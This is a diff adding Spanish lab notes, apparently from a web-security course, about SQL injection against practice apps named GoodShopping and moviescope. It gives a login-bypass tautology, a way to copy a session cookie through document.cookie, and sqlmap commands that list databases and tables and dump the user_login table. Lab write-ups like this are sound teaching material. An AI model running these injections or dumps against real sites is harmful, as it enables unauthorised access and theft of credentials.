@@ -40,7 +40,19 @@ Parameter Tampering
 
 SQL Injection
 -------------
+- Pregunta: ¿Cuántos pedidos tiene el usuario Smith en la cuenta de la compra de GoodShopping?
+- En el menú Login, escribimos la tautología "' OR 1=1 -- - " en el usuario y me dejará entrar.
+- Solución: El usuario Smith tiene 2 pedidos.
 
 SQLMAP
 ------
+Utilizaremos la herramienta SQLMAP para realizar una automatización de inyección SQL en la aplicación moviescope.
+- Necesitaremos la cookie que tiene el usuario que ya está conectado a la aplicación web para ello hacemos clic derecho y elegimos Inspeccionar elemento.
+- Nos dirigimos al apartado consola, ponemos document.cookie, saldrá la cookie y la copiamos.
+- Abrimos una consola.
+- El comando de sqlmap para extraer las bases de datos: sqlmap --cookie "[cookie]" -u "[url_con_param_inyectable]" --dbs --fresh-queries (Si ha salido mal).
+- El comando para obtener las tablas de una base de datos: sqlmap --cookie "[cookie]" -u "[url_con param_inyectable]" -D moviescope --tables
+- El comando para obtener las columnas de una tabla concreta: sqlmap --cookie "[cookie]" -u "[url_con param_inyectable]" -D moviescope -T user_login --columns
+- El comando para obtener lo que hay guardado en una tabla: sqlmap --cookie "[cookie]" -u "[url_con param_inyectable]" -D moviescope -T user_login --dump
+
 
